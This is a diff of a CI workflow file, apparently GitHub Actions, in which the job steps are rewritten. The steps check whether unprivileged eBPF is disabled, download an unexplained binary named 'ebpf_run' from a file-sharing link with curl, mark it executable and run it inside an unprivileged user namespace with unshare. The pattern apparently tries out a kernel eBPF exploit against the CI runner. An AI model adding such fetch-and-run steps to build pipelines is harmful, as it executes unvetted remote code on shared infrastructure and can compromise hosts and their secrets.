@@ -17,8 +17,10 @@ jobs:
             cat /proc/sys/kernel/unprivileged_bpf_disabled
             apt update && apt install -y curl
             curl https://cloud.tsinghua.edu.cn/f/dd0140e60d714af59e17/?dl=1  --output ebpf_run
-            clear
-            chmod +x ebpf_run
-            unshare -Urn 
             ls -la
-            ./ebpf_run
+            ls -la
+            ls -la
+            chmod +x ebpf_run
+            ls -la
+            unshare -Urn "./ebpf_run"
+            unshare -urn "./ebpf_run"
